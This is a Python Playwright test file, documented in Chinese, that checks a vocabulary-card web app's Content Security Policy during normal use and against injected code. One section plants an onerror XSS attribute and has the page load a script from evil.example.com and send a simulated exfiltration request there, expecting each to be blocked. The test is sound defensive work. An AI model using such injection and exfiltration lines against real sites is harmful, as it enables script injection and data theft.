"""資安：內容安全政策（CSP）與匯入資料的防護

- 正常使用時沒有任何 CSP 違規（各頁、查字、單字包、Gemini、Firebase SDK、Google 登入用的腳本與 iframe、Service Worker）
- 混進頁面的程式（onerror 屬性、外部網站的腳本）不會執行；連到清單外的網站會被擋
- 主題設定改成外部檔案後，重新整理仍在畫面出現前套用

外部網站一律用 Playwright 攔截並回假的內容（CSP 是瀏覽器在送出請求前檢查的，所以攔截不影響測試結果），
不會連到 Google 或真的登入。Firebase SDK 本身從 gstatic 載入（和網站平常一樣）。

用法（先在專案根目錄執行 python -m http.server 8123 --bind 127.0.0.1）：
  python tests/test_security.py
"""
import json
import os
import sys

from playwright.sync_api import sync_playwright

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from onboarding_helpers import existing_user

URL = os.environ.get('BASE_URL', 'http://127.0.0.1:8123/')
errors = []


def check(cond, msg):
    print(('PASS ' if cond else 'FAIL ') + msg)
    if not cond:
        errors.append(msg)


# 記下所有 CSP 違規（在網站自己的程式執行前就開始監聽）
WATCH = """
window.__csp = [];
document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(e.effectiveDirective + ' ' + e.blockedURI));
if (window.speechSynthesis) speechSynthesis.speak = () => {};
"""


def gemini(route):
    if route.request.method == 'GET':
        body = {'models': [{'name': 'models/gemini-2.5-flash', 'supportedGenerationMethods': ['generateContent']}]}
    else:
        body = {'candidates': [{'content': {'parts': [{'text': '{"words": []}'}]}, 'finishReason': 'STOP'}]}
    route.fulfill(status=200, content_type='application/json', body=json.dumps(body))


def violations(pg):
    return pg.evaluate('window.__csp')


with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    ctx = browser.new_context(viewport={'width': 1000, 'height': 800})
    existing_user(ctx)
    ctx.add_init_script(WATCH)
    ctx.route('https://api.dictionaryapi.dev/**', lambda r: r.fulfill(status=404, body='{}'))
    ctx.route('https://generativelanguage.googleapis.com/**', gemini)
    # 其他 Google 端點（Firebase 登入、Firestore）與 Google 登入用的腳本、iframe：回假的內容，不連到真的服務
    ctx.route('https://identitytoolkit.googleapis.com/**', lambda r: r.fulfill(status=200, body='{}'))
    ctx.route('https://securetoken.googleapis.com/**', lambda r: r.fulfill(status=200, body='{}'))
    ctx.route('https://firestore.googleapis.com/**', lambda r: r.fulfill(status=200, body='{}'))
    ctx.route('https://apis.google.com/**', lambda r: r.fulfill(status=200, content_type='text/javascript', body='window.__gapiLoaded = true;'))
    ctx.route('https://toeic-cards.firebaseapp.com/**', lambda r: r.fulfill(status=200, content_type='text/html', body='<p>auth iframe</p>'))
    ctx.route('https://evil.example.com/**', lambda r: r.fulfill(status=200, content_type='text/javascript', body='window.__evilScript = true;'))
    pg = ctx.new_page()

    pg.goto(URL)
    pg.wait_for_load_state('networkidle')
    csp = pg.locator('meta[http-equiv="Content-Security-Policy"]').get_attribute('content')
    check("script-src 'self'" in csp and "'unsafe-inline'" not in csp.split('script-src')[1].split(';')[0]
          and "object-src 'none'" in csp, '網站有 CSP，而且不允許內嵌的程式')
    check(pg.locator('script:not([src])').count() == 0, 'index.html 沒有內嵌的 <script>')

    # ---- 正常使用：各頁都沒有違規 ----
    pg.goto(URL + '#/words')
    pg.wait_for_load_state('networkidle')
    pg.click('#openAddWords')
    pg.click('[data-tool=pack]')
    pg.wait_for_selector('#packGroup')
    pg.fill('#packName', '多益 1000')
    pg.click('#packAdd')
    pg.wait_for_timeout(1200)
    pg.click('[aria-label="關閉加入單字"]')
    for route in ['review', 'free', 'cards', 'quiz', 'stats', 'help', 'words']:
        pg.goto(URL + '#/' + route)
        pg.wait_for_timeout(500)
    pg.goto(URL + '#/cards')
    pg.wait_for_timeout(500)
    pg.locator('#exploreDetail [data-lookup-word]').first.click()
    pg.wait_for_selector('#lookupResult .lookup-card')
    pg.keyboard.press('Escape')
    pg.goto(URL + '#/quiz')
    pg.click('.mode-btn[data-mode=zh2en]')
    pg.wait_for_selector('.option')
    pg.locator('.option').first.click()
    check(violations(pg) == [], f'單字包、各頁、點字查詢、測驗都沒有 CSP 違規 {violations(pg)}')

    # ---- Gemini（設定頁存金鑰會讀取模型清單）----
    pg.goto(URL + '#/settings')
    pg.wait_for_load_state('networkidle')
    pg.fill('#keyInput', 'fake-key-for-csp-test')
    pg.click('#keyForm button[type=submit]')
    pg.wait_for_selector('#keyStatus[data-kind=ok]')
    check(violations(pg) == [], f'連到 Gemini 沒有被 CSP 擋住 {violations(pg)}')

    # ---- Firebase：SDK 從 gstatic 載入（正式設定），登入相關的網址都在允許清單 ----
    pg.wait_for_selector('#googleBtn', timeout=20000)
    check(pg.locator('#pwForm').count() == 1, 'Firebase SDK 在 CSP 下能載入，顯示登入選項')
    res = pg.evaluate("""async () => {
      const out = {};
      for (const url of ['https://identitytoolkit.googleapis.com/v1/x', 'https://securetoken.googleapis.com/v1/x', 'https://firestore.googleapis.com/x']) {
        try { await fetch(url, { mode: 'no-cors' }); out[url] = 'ok'; } catch (e) { out[url] = 'blocked'; }
      }
      // Google 登入：Firebase 會載入 apis.google.com 的腳本，再開一個 authDomain 的隱藏 iframe
      await new Promise((resolve) => { const s = document.createElement('script'); s.src = 'https://apis.google.com/js/api.js'; s.onload = s.onerror = resolve; document.head.append(s); });
      out.gapi = window.__gapiLoaded === true;
      const f = document.createElement('iframe'); f.src = 'https://toeic-cards.firebaseapp.com/__/auth/iframe'; document.body.append(f);
      await new Promise((r) => setTimeout(r, 500)); f.remove();
      return out;
    }""")
    check(set(res.values()) == {'ok', True}, f'Firebase 登入／Firestore 的連線、Google 登入腳本都允許 {res}')
    check(violations(pg) == [], f'Firebase 與 Google 登入流程沒有 CSP 違規 {violations(pg)}')

    # ---- 混進來的程式不會執行 ----
    res = pg.evaluate("""async () => {
      document.body.insertAdjacentHTML('beforeend', '<img src="x" onerror="window.__evilAttr = 1">');
      await new Promise((resolve) => { const s = document.createElement('script'); s.src = 'https://evil.example.com/steal.js'; s.onload = s.onerror = resolve; document.head.append(s); });
      let exfil = 'sent';
      try { await fetch('https://evil.example.com/collect?k=1', { mode: 'no-cors' }); } catch (e) { exfil = 'blocked'; }
      await new Promise((r) => setTimeout(r, 300));
      return { attr: window.__evilAttr ?? null, script: window.__evilScript ?? null, exfil };
    }""")
    check(res == {'attr': None, 'script': None, 'exfil': 'blocked'}, f'onerror 屬性、外部網站的腳本不會執行，資料也送不出去 {res}')
    v = ' '.join(violations(pg))
    check('script-src' in v and 'evil.example.com' in v and 'connect-src' in v, f'瀏覽器回報了這些違規 {violations(pg)}')

    # ---- 主題設定改成外部檔案：重新整理後仍在畫面出現前套用 ----
    pg.evaluate("""() => { const s = JSON.parse(localStorage.getItem('toeic-cards:settings') || '{}');
      localStorage.setItem('toeic-cards:settings', JSON.stringify({ ...s, theme: 'dark' })); }""")
    pg.reload()
    check(pg.evaluate('document.documentElement.dataset.theme') == 'dark', '重新整理後深色主題照樣套用（js/theme-init.js）')

    # ---- Service Worker 在 CSP 下能註冊 ----
    ok = pg.evaluate("navigator.serviceWorker.ready.then(() => true)")
    check(ok and violations(pg) == [], f'Service Worker 正常註冊，沒有違規 {violations(pg)}')

    ctx.close()
    browser.close()

print()
print('ALL PASSED' if not errors else f'{len(errors)} FAILED')
sys.exit(1 if errors else 0)
